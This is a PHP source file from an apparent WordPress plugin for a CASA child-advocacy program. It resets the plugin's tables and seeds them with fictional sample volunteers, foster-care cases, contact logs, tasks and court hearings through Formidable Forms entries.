function casa_add_sample_data() {
    global $wpdb;

    $results = array();
    $now = current_time('mysql');
    $organization_id = 1; // Default CASA Program

    // Check if tables exist first
    $volunteers_table = $wpdb->prefix . 'casa_volunteers';
    $cases_table = $wpdb->prefix . 'casa_cases';
    $contact_logs_table = $wpdb->prefix . 'casa_contact_logs';
    $hearings_table = $wpdb->prefix . 'casa_court_hearings';

    // Only clear if tables exist
    if ($wpdb->get_var("SHOW TABLES LIKE '$volunteers_table'") === $volunteers_table) {
        $wpdb->query("DELETE FROM $volunteers_table");
    }
    if ($wpdb->get_var("SHOW TABLES LIKE '$cases_table'") === $cases_table) {
        $wpdb->query("DELETE FROM $cases_table");
    }
    if ($wpdb->get_var("SHOW TABLES LIKE '$contact_logs_table'") === $contact_logs_table) {
        $wpdb->query("DELETE FROM $contact_logs_table");
    }
    if ($wpdb->get_var("SHOW TABLES LIKE '$hearings_table'") === $hearings_table) {
        $wpdb->query("DELETE FROM $hearings_table");
    }
    $results[] = 'Cleared existing CASA table data';

    // ========================================
    // Sample Volunteers via Formidable Forms (Form 2)
    // ========================================
    $sample_volunteers = array(
        array(
            'vol_first_name' => 'Sarah',
            'vol_last_name' => 'Johnson',
            'vol_email' => 'sarah.johnson@example.com',
            'vol_phone' => '555-0101',
            'vol_dob' => '1985-03-15',
            'vol_address' => '123 Oak Street',
            'vol_city' => 'Atlanta',
            'vol_state' => 'GA',
            'vol_zip' => '30301',
            'emergency_name' => 'John Johnson',
            'emergency_phone' => '555-0102',
            'emergency_relationship' => 'Spouse',
            'employer' => 'Tech Solutions Inc',
            'occupation' => 'Software Developer',
            'education_level' => 'Bachelors',
            'languages' => 'English, Spanish',
            'volunteer_experience' => 'Mentored youth for 5 years at local community center',
            'preferred_schedule' => 'Weekends and Wednesday evenings',
            'max_cases' => 3,
            'availability_notes' => 'Available for court hearings with 48hr notice',
            'ref1_name' => 'Dr. Patricia Adams',
            'ref1_phone' => '555-0103',
            'ref1_relationship' => 'Former Supervisor',
            'ref2_name' => 'Mark Stevens',
            'ref2_phone' => '555-0104',
            'ref2_relationship' => 'Colleague',
            'age_preference' => '5-12 years',
            'special_needs_exp' => '1',
            'transportation' => '1',
            'background_check_consent' => '1',
            'liability_waiver' => '1',
            'confidentiality_agreement' => '1',
            'vol_organization_id' => $organization_id
        ),
        array(
            'vol_first_name' => 'Michael',
            'vol_last_name' => 'Williams',
            'vol_email' => 'michael.williams@example.com',
            'vol_phone' => '555-0201',
            'vol_dob' => '1978-07-22',
            'vol_address' => '456 Maple Avenue',
            'vol_city' => 'Atlanta',
            'vol_state' => 'GA',
            'vol_zip' => '30302',
            'emergency_name' => 'Lisa Williams',
            'emergency_phone' => '555-0202',
            'emergency_relationship' => 'Wife',
            'employer' => 'Retired',
            'occupation' => 'Former Teacher',
            'education_level' => 'Masters',
            'languages' => 'English',
            'volunteer_experience' => '10 years as youth group leader',
            'preferred_schedule' => 'Flexible - available most days',
            'max_cases' => 2,
            'availability_notes' => 'Retired, very flexible schedule',
            'ref1_name' => 'Susan Clark',
            'ref1_phone' => '555-0203',
            'ref1_relationship' => 'Former Principal',
            'ref2_name' => 'David Thompson',
            'ref2_phone' => '555-0204',
            'ref2_relationship' => 'Pastor',
            'age_preference' => 'Any age',
            'special_needs_exp' => '1',
            'transportation' => '1',
            'background_check_consent' => '1',
            'liability_waiver' => '1',
            'confidentiality_agreement' => '1',
            'vol_organization_id' => $organization_id
        ),
        array(
            'vol_first_name' => 'Emily',
            'vol_last_name' => 'Brown',
            'vol_email' => 'emily.brown@example.com',
            'vol_phone' => '555-0301',
            'vol_dob' => '1990-11-08',
            'vol_address' => '789 Pine Road',
            'vol_city' => 'Marietta',
            'vol_state' => 'GA',
            'vol_zip' => '30060',
            'emergency_name' => 'Robert Brown',
            'emergency_phone' => '555-0302',
            'emergency_relationship' => 'Father',
            'employer' => 'Childrens Hospital',
            'occupation' => 'Pediatric Nurse',
            'education_level' => 'Bachelors',
            'languages' => 'English, French',
            'volunteer_experience' => 'Hospital volunteer program',
            'preferred_schedule' => 'Weekends only',
            'max_cases' => 4,
            'availability_notes' => 'Works 3 days/week, available other days',
            'ref1_name' => 'Dr. Amanda Chen',
            'ref1_phone' => '555-0303',
            'ref1_relationship' => 'Supervisor',
            'ref2_name' => 'Jennifer Lopez',
            'ref2_phone' => '555-0304',
            'ref2_relationship' => 'Coworker',
            'age_preference' => '0-5 years',
            'special_needs_exp' => '1',
            'transportation' => '1',
            'background_check_consent' => '1',
            'liability_waiver' => '1',
            'confidentiality_agreement' => '1',
            'vol_organization_id' => $organization_id
        ),
    );

    // Field ID mappings for Volunteer form (Form 2)
    $volunteer_field_map = array(
        'vol_first_name' => 30, 'vol_last_name' => 31, 'vol_email' => 32, 'vol_phone' => 33,
        'vol_dob' => 34, 'vol_address' => 35, 'vol_city' => 36, 'vol_state' => 37, 'vol_zip' => 38,
        'emergency_name' => 39, 'emergency_phone' => 40, 'emergency_relationship' => 41,
        'employer' => 42, 'occupation' => 43, 'education_level' => 44, 'languages' => 45,
        'volunteer_experience' => 46, 'preferred_schedule' => 47, 'max_cases' => 48,
        'availability_notes' => 49, 'ref1_name' => 50, 'ref1_phone' => 51, 'ref1_relationship' => 52,
        'ref2_name' => 53, 'ref2_phone' => 54, 'ref2_relationship' => 55, 'age_preference' => 56,
        'special_needs_exp' => 57, 'transportation' => 58, 'background_check_consent' => 59,
        'liability_waiver' => 60, 'confidentiality_agreement' => 61, 'vol_organization_id' => 62
    );

    $volunteer_ids = array();
    foreach ($sample_volunteers as $index => $volunteer) {
        // Create Formidable Forms entry
        $entry_id = casa_create_ff_entry(2, $volunteer, $volunteer_field_map, $now);

        // Also sync to CASA volunteers table
        $wpdb->insert($wpdb->prefix . 'casa_volunteers', array(
            'organization_id' => $organization_id,
            'first_name' => $volunteer['vol_first_name'],
            'last_name' => $volunteer['vol_last_name'],
            'email' => $volunteer['vol_email'],
            'phone' => $volunteer['vol_phone'],
            'address' => $volunteer['vol_address'],
            'city' => $volunteer['vol_city'],
            'state' => $volunteer['vol_state'],
            'zip_code' => $volunteer['vol_zip'],
            'date_of_birth' => $volunteer['vol_dob'],
            'emergency_contact_name' => $volunteer['emergency_name'],
            'emergency_contact_phone' => $volunteer['emergency_phone'],
            'volunteer_status' => 'active',
            'background_check_status' => 'approved',
            'training_status' => $index == 2 ? 'in_progress' : 'completed',
            'max_cases' => $volunteer['max_cases'],
            'assigned_cases_count' => $index == 0 ? 2 : ($index == 1 ? 1 : 0),
            'created_by' => 1,
            'created_at' => $now,
            'updated_at' => $now
        ));
        $volunteer_ids[] = $wpdb->insert_id;
    }
    $results[] = 'Added 3 sample volunteers via Formidable Forms';

    // ========================================
    // Sample Cases via Formidable Forms (Form 1)
    // ========================================
    $sample_cases = array(
        array(
            'child_first_name' => 'Emma',
            'child_last_name' => 'Davis',
            'child_dob' => '2015-06-12',
            'child_gender' => 'Female',
            'child_ethnicity' => 'Caucasian',
            'case_number' => 'CASA-2024-001',
            'case_type' => 'Dependency',
            'case_priority' => 'High',
            'case_status' => 'Active',
            'referral_date' => '2024-01-15',
            'case_summary' => 'Child removed from home due to neglect. Currently placed with foster family. Working toward reunification with mother.',
            'court_jurisdiction' => 'Juvenile Court',
            'assigned_judge' => 'Hon. Patricia Martinez',
            'courtroom' => 'Courtroom 3B',
            'current_placement' => 'Foster Home',
            'placement_date' => '2024-01-20',
            'placement_address' => '456 Foster Lane, Atlanta, GA 30303',
            'placement_contact' => 'Mary Foster',
            'placement_phone' => '555-0401',
            'assigned_volunteer_id' => isset($volunteer_ids[0]) ? $volunteer_ids[0] : 1,
            'assignment_date' => '2024-01-25',
            'case_goals' => 'Reunification with biological mother after completion of parenting classes and stable housing',
            'organization_id' => $organization_id
        ),
        array(
            'child_first_name' => 'James',
            'child_last_name' => 'Miller',
            'child_dob' => '2012-02-28',
            'child_gender' => 'Male',
            'child_ethnicity' => 'African American',
            'case_number' => 'CASA-2024-002',
            'case_type' => 'Dependency',
            'case_priority' => 'Medium',
            'case_status' => 'Active',
            'referral_date' => '2024-02-01',
            'case_summary' => 'Child placed with maternal grandmother after parents incarceration. Stable placement.',
            'court_jurisdiction' => 'Family Court',
            'assigned_judge' => 'Hon. Robert Thompson',
            'courtroom' => 'Courtroom 2A',
            'current_placement' => 'Relative Placement',
            'placement_date' => '2024-02-05',
            'placement_address' => '789 Grandma Way, Atlanta, GA 30304',
            'placement_contact' => 'Dorothy Miller',
            'placement_phone' => '555-0402',
            'assigned_volunteer_id' => isset($volunteer_ids[0]) ? $volunteer_ids[0] : 1,
            'assignment_date' => '2024-02-10',
            'case_goals' => 'Permanent guardianship with grandmother',
            'organization_id' => $organization_id
        ),
        array(
            'child_first_name' => 'Sophia',
            'child_last_name' => 'Garcia',
            'child_dob' => '2017-09-05',
            'child_gender' => 'Female',
            'child_ethnicity' => 'Hispanic',
            'case_number' => 'CASA-2024-003',
            'case_type' => 'Termination of Parental Rights',
            'case_priority' => 'High',
            'case_status' => 'Active',
            'referral_date' => '2024-03-10',
            'case_summary' => 'TPR proceedings initiated. Child has been in foster care for 18 months. Prospective adoptive family identified.',
            'court_jurisdiction' => 'Juvenile Court',
            'assigned_judge' => 'Hon. Patricia Martinez',
            'courtroom' => 'Courtroom 3B',
            'current_placement' => 'Foster Home',
            'placement_date' => '2022-09-15',
            'placement_address' => '123 Adoption Avenue, Atlanta, GA 30305',
            'placement_contact' => 'John and Maria Santos',
            'placement_phone' => '555-0403',
            'assigned_volunteer_id' => isset($volunteer_ids[1]) ? $volunteer_ids[1] : 2,
            'assignment_date' => '2024-03-15',
            'case_goals' => 'Finalize adoption with current foster family',
            'organization_id' => $organization_id
        ),
        array(
            'child_first_name' => 'Liam',
            'child_last_name' => 'Anderson',
            'child_dob' => '2014-04-18',
            'child_gender' => 'Male',
            'child_ethnicity' => 'Mixed Race',
            'case_number' => 'CASA-2024-004',
            'case_type' => 'Dependency',
            'case_priority' => 'Medium',
            'case_status' => 'Pending',
            'referral_date' => '2024-04-01',
            'case_summary' => 'New case awaiting volunteer assignment. Child has special educational needs.',
            'court_jurisdiction' => 'Juvenile Court',
            'assigned_judge' => 'Hon. David Lee',
            'courtroom' => 'Courtroom 1A',
            'current_placement' => 'Group Home',
            'placement_date' => '2024-04-05',
            'placement_address' => '567 Group Home Blvd, Atlanta, GA 30306',
            'placement_contact' => 'Staff Supervisor',
            'placement_phone' => '555-0404',
            'case_goals' => 'Find appropriate foster placement, ensure IEP compliance',
            'organization_id' => $organization_id
        ),
        array(
            'child_first_name' => 'Olivia',
            'child_last_name' => 'Taylor',
            'child_dob' => '2016-12-03',
            'child_gender' => 'Female',
            'child_ethnicity' => 'Caucasian',
            'case_number' => 'CASA-2024-005',
            'case_type' => 'Guardianship',
            'case_priority' => 'Low',
            'case_status' => 'Closed',
            'referral_date' => '2023-09-15',
            'case_summary' => 'Guardianship successfully granted to maternal aunt. Case closed with positive outcome.',
            'court_jurisdiction' => 'Family Court',
            'assigned_judge' => 'Hon. Robert Thompson',
            'courtroom' => 'Courtroom 2A',
            'current_placement' => 'Relative Placement',
            'placement_date' => '2023-09-20',
            'placement_address' => '890 Aunt Lane, Marietta, GA 30060',
            'placement_contact' => 'Susan Taylor',
            'placement_phone' => '555-0405',
            'case_goals' => 'Case successfully closed - guardianship finalized',
            'organization_id' => $organization_id
        ),
    );

    // Field ID mappings for Case Intake form (Form 1)
    $case_field_map = array(
        'child_first_name' => 1, 'child_last_name' => 2, 'child_dob' => 3, 'child_gender' => 4,
        'child_ethnicity' => 5, 'case_number' => 6, 'case_type' => 7, 'case_priority' => 8,
        'case_status' => 9, 'referral_date' => 10, 'case_summary' => 11, 'court_jurisdiction' => 12,
        'assigned_judge' => 13, 'courtroom' => 14, 'current_placement' => 15, 'placement_date' => 16,
        'placement_address' => 17, 'placement_contact' => 18, 'placement_phone' => 19,
        'assigned_volunteer_id' => 20, 'assignment_date' => 21, 'case_goals' => 22, 'organization_id' => 23
    );

    foreach ($sample_cases as $case) {
        // Create Formidable Forms entry
        casa_create_ff_entry(1, $case, $case_field_map, $now);

        // Also sync to CASA cases table
        $wpdb->insert($wpdb->prefix . 'casa_cases', array(
            'case_number' => $case['case_number'],
            'organization_id' => $organization_id,
            'child_first_name' => $case['child_first_name'],
            'child_last_name' => $case['child_last_name'],
            'child_dob' => $case['child_dob'],
            'case_type' => strtolower(str_replace(' ', '_', $case['case_type'])),
            'status' => strtolower($case['case_status']),
            'priority' => strtolower($case['case_priority']),
            'referral_date' => $case['referral_date'],
            'court_jurisdiction' => $case['court_jurisdiction'],
            'assigned_judge' => $case['assigned_judge'],
            'placement_type' => strtolower(str_replace(' ', '_', $case['current_placement'])),
            'assigned_volunteer_id' => isset($case['assigned_volunteer_id']) ? $case['assigned_volunteer_id'] : null,
            'case_summary' => $case['case_summary'],
            'created_by' => 1,
            'created_at' => $now,
            'updated_at' => $now
        ));
    }
    $results[] = 'Added 5 sample cases via Formidable Forms';

    // ========================================
    // Sample Contact Logs via Formidable Forms (Form 3)
    // ========================================
    $sample_contacts = array(
        array(
            'contact_case_id' => 1,
            'contact_type' => 'In-Person Visit',
            'contact_date' => '2024-04-15',
            'contact_time' => '14:00',
            'duration_minutes' => 60,
            'contact_location' => 'Foster Home',
            'participants' => 'Child, Foster Mother',
            'purpose' => 'Monthly check-in visit',
            'summary' => 'Regular monthly visit with Emma. She appears happy and well-adjusted in the foster home. Discussed school progress and upcoming court date. Emma was excited to show her artwork from school. Good rapport with foster mother.',
            'observations' => 'Child appears healthy and happy. Clean clothing, good hygiene.',
            'concerns' => 'None at this time',
            'follow_up_required' => '1',
            'follow_up_notes' => 'Need to follow up on IEP meeting scheduled for next month',
            'next_contact_date' => date('Y-m-d', strtotime('+30 days')),
            'mileage' => 15,
            'expenses' => 0,
            'contact_volunteer_id' => isset($volunteer_ids[0]) ? $volunteer_ids[0] : 1,
            'contact_organization_id' => $organization_id
        ),
        array(
            'contact_case_id' => 1,
            'contact_type' => 'Phone Call',
            'contact_date' => '2024-04-20',
            'contact_time' => '10:30',
            'duration_minutes' => 20,
            'contact_location' => 'Phone',
            'participants' => 'School Counselor',
            'purpose' => 'Academic progress check',
            'summary' => 'Spoke with school counselor about Emma academic progress. She is meeting grade-level expectations. Counselor noted Emma has made friends and seems happy at school.',
            'observations' => 'Academic progress on track',
            'concerns' => '',
            'follow_up_required' => '0',
            'contact_volunteer_id' => isset($volunteer_ids[0]) ? $volunteer_ids[0] : 1,
            'contact_organization_id' => $organization_id
        ),
        array(
            'contact_case_id' => 2,
            'contact_type' => 'In-Person Visit',
            'contact_date' => '2024-04-18',
            'contact_time' => '16:00',
            'duration_minutes' => 45,
            'contact_location' => 'Grandmother Home',
            'participants' => 'Child, Grandmother',
            'purpose' => 'Home visit and check-in',
            'summary' => 'Visited James at his grandmothers home. He is doing well academically and enjoying soccer. Strong bond with grandmother. Home is clean and well-maintained.',
            'observations' => 'Stable home environment, positive interaction between child and grandmother',
            'concerns' => '',
            'follow_up_required' => '0',
            'mileage' => 20,
            'contact_volunteer_id' => isset($volunteer_ids[0]) ? $volunteer_ids[0] : 1,
            'contact_organization_id' => $organization_id
        ),
        array(
            'contact_case_id' => 3,
            'contact_type' => 'Other',
            'contact_date' => '2024-04-10',
            'contact_time' => '09:00',
            'duration_minutes' => 120,
            'contact_location' => 'Courthouse',
            'participants' => 'Judge, Attorneys, Case Worker, Foster Parents',
            'purpose' => 'TPR Hearing',
            'summary' => 'Attended TPR hearing. Judge scheduled final hearing for next month. Submitted CASA report recommending adoption. Foster parents expressed commitment to adopting Sophia.',
            'observations' => 'All parties in agreement regarding adoption',
            'concerns' => '',
            'follow_up_required' => '1',
            'follow_up_notes' => 'Prepare final court report for adoption hearing',
            'next_contact_date' => date('Y-m-d', strtotime('+21 days')),
            'mileage' => 25,
            'contact_volunteer_id' => isset($volunteer_ids[1]) ? $volunteer_ids[1] : 2,
            'contact_organization_id' => $organization_id
        ),
    );

    // Field ID mappings for Contact Log form (Form 3)
    $contact_field_map = array(
        'contact_case_id' => 70, 'contact_type' => 71, 'contact_date' => 72, 'contact_time' => 73,
        'duration_minutes' => 74, 'contact_location' => 75, 'participants' => 76, 'purpose' => 77,
        'summary' => 78, 'observations' => 79, 'concerns' => 80, 'follow_up_required' => 81,
        'follow_up_notes' => 82, 'next_contact_date' => 83, 'mileage' => 84, 'expenses' => 85,
        'contact_volunteer_id' => 86, 'contact_organization_id' => 87
    );

    foreach ($sample_contacts as $contact) {
        // Create Formidable Forms entry
        casa_create_ff_entry(3, $contact, $contact_field_map, $now);

        // Also sync to CASA contact_logs table
        $wpdb->insert($wpdb->prefix . 'casa_contact_logs', array(
            'case_number' => 'CASA-2024-00' . $contact['contact_case_id'],
            'organization_id' => $organization_id,
            'contact_type' => strtolower(str_replace(array('-', ' '), '_', $contact['contact_type'])),
            'contact_date' => $contact['contact_date'] . ' ' . $contact['contact_time'] . ':00',
            'contact_duration' => $contact['duration_minutes'],
            'contact_person' => $contact['participants'],
            'contact_notes' => $contact['summary'],
            'follow_up_required' => isset($contact['follow_up_required']) ? intval($contact['follow_up_required']) : 0,
            'follow_up_notes' => isset($contact['follow_up_notes']) ? $contact['follow_up_notes'] : null,
            'created_by' => 1,
            'created_at' => $now,
            'updated_at' => $now
        ));
    }
    $results[] = 'Added 4 sample contact logs via Formidable Forms';

    // ========================================
    // Sample Tasks (direct to CASA table)
    // ========================================
    $tasks_table = $wpdb->prefix . 'casa_tasks';

    // Create tasks table if it doesn't exist
    if ($wpdb->get_var("SHOW TABLES LIKE '$tasks_table'") !== $tasks_table) {
        $charset_collate = $wpdb->get_charset_collate();
        $sql = "CREATE TABLE IF NOT EXISTS $tasks_table (
            id bigint(20) NOT NULL AUTO_INCREMENT,
            organization_id bigint(20) NOT NULL,
            case_id bigint(20) NULL,
            title varchar(255) NOT NULL,
            description text,
            due_date date NOT NULL,
            due_time time NULL,
            priority varchar(20) DEFAULT 'medium',
            status varchar(20) DEFAULT 'pending',
            assigned_to bigint(20) NULL,
            created_by bigint(20) NOT NULL,
            completed_at datetime NULL,
            created_at datetime DEFAULT CURRENT_TIMESTAMP,
            updated_at datetime DEFAULT CURRENT_TIMESTAMP ON UPDATE CURRENT_TIMESTAMP,
            PRIMARY KEY (id),
            KEY organization_id (organization_id),
            KEY case_id (case_id),
            KEY due_date (due_date),
            KEY status (status),
            KEY assigned_to (assigned_to)
        ) $charset_collate;";
        $wpdb->query($sql);
        $results[] = 'Created casa_tasks table';
    }

    // Clear existing tasks
    $wpdb->query("DELETE FROM $tasks_table");

    $sample_tasks = array(
        array(
            'organization_id' => $organization_id,
            'case_id' => 1, // Emma Davis case
            'title' => 'Schedule home visit with Emma Davis',
            'description' => 'Monthly home visit to assess placement stability and child wellbeing.',
            'due_date' => date('Y-m-d', strtotime('+3 days')),
            'due_time' => '14:00:00',
            'priority' => 'high',
            'status' => 'pending',
            'assigned_to' => isset($volunteer_ids[0]) ? $volunteer_ids[0] : 1,
            'created_by' => 1,
            'created_at' => $now,
            'updated_at' => $now
        ),
        array(
            'organization_id' => $organization_id,
            'case_id' => 1, // Emma Davis case
            'title' => 'Submit court report for Emma Davis review hearing',
            'description' => 'Prepare and submit CASA report 5 days before scheduled review hearing.',
            'due_date' => date('Y-m-d', strtotime('+2 days')),
            'due_time' => '17:00:00',
            'priority' => 'high',
            'status' => 'in_progress',
            'assigned_to' => isset($volunteer_ids[0]) ? $volunteer_ids[0] : 1,
            'created_by' => 1,
            'created_at' => $now,
            'updated_at' => $now
        ),
        array(
            'organization_id' => $organization_id,
            'case_id' => 2, // James Miller case
            'title' => 'Contact school counselor for James Miller',
            'description' => 'Follow up on academic progress and any concerns from teachers.',
            'due_date' => date('Y-m-d', strtotime('+5 days')),
            'due_time' => '10:00:00',
            'priority' => 'medium',
            'status' => 'pending',
            'assigned_to' => isset($volunteer_ids[0]) ? $volunteer_ids[0] : 1,
            'created_by' => 1,
            'created_at' => $now,
            'updated_at' => $now
        ),
        array(
            'organization_id' => $organization_id,
            'case_id' => 2, // James Miller case
            'title' => 'Prepare permanency hearing report for James Miller',
            'description' => 'Document recommendation for long-term placement with grandmother.',
            'due_date' => date('Y-m-d', strtotime('+9 days')),
            'due_time' => NULL,
            'priority' => 'high',
            'status' => 'pending',
            'assigned_to' => isset($volunteer_ids[0]) ? $volunteer_ids[0] : 1,
            'created_by' => 1,
            'created_at' => $now,
            'updated_at' => $now
        ),
        array(
            'organization_id' => $organization_id,
            'case_id' => 3, // Sophia Garcia case
            'title' => 'Visit Sophia Garcia before adoption hearing',
            'description' => 'Final home visit before adoption finalization.',
            'due_date' => date('Y-m-d', strtotime('+14 days')),
            'due_time' => '15:00:00',
            'priority' => 'medium',
            'status' => 'pending',
            'assigned_to' => isset($volunteer_ids[1]) ? $volunteer_ids[1] : 2,
            'created_by' => 1,
            'created_at' => $now,
            'updated_at' => $now
        ),
        array(
            'organization_id' => $organization_id,
            'case_id' => 3, // Sophia Garcia case
            'title' => 'Complete final adoption report for Sophia Garcia',
            'description' => 'Submit final CASA recommendation supporting adoption by foster family.',
            'due_date' => date('Y-m-d', strtotime('+16 days')),
            'due_time' => '12:00:00',
            'priority' => 'high',
            'status' => 'pending',
            'assigned_to' => isset($volunteer_ids[1]) ? $volunteer_ids[1] : 2,
            'created_by' => 1,
            'created_at' => $now,
            'updated_at' => $now
        ),
        array(
            'organization_id' => $organization_id,
            'case_id' => 4, // Liam Anderson case
            'title' => 'Review IEP documents for Liam Anderson',
            'description' => 'Ensure special educational needs are being met at group home.',
            'due_date' => date('Y-m-d', strtotime('+7 days')),
            'due_time' => NULL,
            'priority' => 'medium',
            'status' => 'pending',
            'assigned_to' => NULL, // Unassigned - case pending volunteer
            'created_by' => 1,
            'created_at' => $now,
            'updated_at' => $now
        ),
        array(
            'organization_id' => $organization_id,
            'case_id' => NULL, // Not case-specific
            'title' => 'Complete monthly volunteer hours report',
            'description' => 'Submit hours and mileage for the month.',
            'due_date' => date('Y-m-d', strtotime('+10 days')),
            'due_time' => NULL,
            'priority' => 'low',
            'status' => 'pending',
            'assigned_to' => isset($volunteer_ids[0]) ? $volunteer_ids[0] : 1,
            'created_by' => 1,
            'created_at' => $now,
            'updated_at' => $now
        ),
        array(
            'organization_id' => $organization_id,
            'case_id' => NULL, // Not case-specific
            'title' => 'Attend CASA training session',
            'description' => 'Quarterly in-service training on trauma-informed care.',
            'due_date' => date('Y-m-d', strtotime('+20 days')),
            'due_time' => '09:00:00',
            'priority' => 'medium',
            'status' => 'pending',
            'assigned_to' => isset($volunteer_ids[2]) ? $volunteer_ids[2] : 3,
            'created_by' => 1,
            'created_at' => $now,
            'updated_at' => $now
        ),
    );

    foreach ($sample_tasks as $task) {
        $wpdb->insert($tasks_table, $task);
    }
    $results[] = 'Added 9 sample tasks';

    // ========================================
    // Sample Court Hearings (direct to CASA table)
    // ========================================
    $sample_hearings = array(
        array(
            'case_number' => 'CASA-2024-001',
            'organization_id' => $organization_id,
            'child_name' => 'Emma Davis',
            'hearing_date' => date('Y-m-d', strtotime('+7 days')),
            'hearing_time' => '09:30:00',
            'hearing_type' => 'Review',
            'court_room' => 'Courtroom 3B',
            'judge_name' => 'Hon. Patricia Martinez',
            'status' => 'scheduled',
            'casa_volunteer_assigned' => 'Sarah Johnson',
            'notes' => 'Six-month review hearing. CASA report due 5 days before.',
            'created_by' => 1,
            'created_at' => $now,
            'updated_at' => $now
        ),
        array(
            'case_number' => 'CASA-2024-002',
            'organization_id' => $organization_id,
            'child_name' => 'James Miller',
            'hearing_date' => date('Y-m-d', strtotime('+14 days')),
            'hearing_time' => '14:00:00',
            'hearing_type' => 'Permanency',
            'court_room' => 'Courtroom 2A',
            'judge_name' => 'Hon. Robert Thompson',
            'status' => 'scheduled',
            'casa_volunteer_assigned' => 'Sarah Johnson',
            'notes' => 'Permanency planning hearing to discuss long-term placement.',
            'created_by' => 1,
            'created_at' => $now,
            'updated_at' => $now
        ),
        array(
            'case_number' => 'CASA-2024-003',
            'organization_id' => $organization_id,
            'child_name' => 'Sophia Garcia',
            'hearing_date' => date('Y-m-d', strtotime('+21 days')),
            'hearing_time' => '10:00:00',
            'hearing_type' => 'Disposition',
            'court_room' => 'Courtroom 3B',
            'judge_name' => 'Hon. Patricia Martinez',
            'status' => 'scheduled',
            'casa_volunteer_assigned' => 'Michael Williams',
            'notes' => 'Final adoption hearing. All parties consent to adoption.',
            'created_by' => 1,
            'created_at' => $now,
            'updated_at' => $now
        ),
    );

    foreach ($sample_hearings as $hearing) {
        $wpdb->insert($wpdb->prefix . 'casa_court_hearings', $hearing);
    }
    $results[] = 'Added 3 sample court hearings';

    return $results;
}

/**
 * Helper function to create a Formidable Forms entry
 */
function casa_create_ff_entry($form_id, $data, $field_map, $now) {
    global $wpdb;

    $items_table = $wpdb->prefix . 'frm_items';
    $metas_table = $wpdb->prefix . 'frm_item_metas';

    // Create the main entry
    $entry_key = 'entry_' . uniqid();
    $entry_name = '';

    // Generate entry name based on form type
    if ($form_id == 1 && isset($data['child_first_name'])) {
        $entry_name = $data['child_first_name'] . ' ' . ($data['child_last_name'] ?? '');
    } elseif ($form_id == 2 && isset($data['vol_first_name'])) {
        $entry_name = $data['vol_first_name'] . ' ' . ($data['vol_last_name'] ?? '');
    } elseif ($form_id == 3) {
        $entry_name = 'Contact Log - ' . ($data['contact_date'] ?? date('Y-m-d'));
    } else {
        $entry_name = 'Entry ' . date('Y-m-d H:i:s');
    }

    $wpdb->insert($items_table, array(
        'item_key' => $entry_key,
        'name' => $entry_name,
        'form_id' => $form_id,
        'user_id' => 1,
        'is_draft' => 0,
        'created_at' => $now,
        'updated_at' => $now
    ));

    $entry_id = $wpdb->insert_id;

    // Create field meta values
    foreach ($data as $field_key => $value) {
        if (isset($field_map[$field_key]) && $value !== null && $value !== '') {
            $wpdb->insert($metas_table, array(
                'meta_value' => $value,
                'field_id' => $field_map[$field_key],
                'item_id' => $entry_id,
                'created_at' => $now
            ));
        }
    }

    return $entry_id;
}
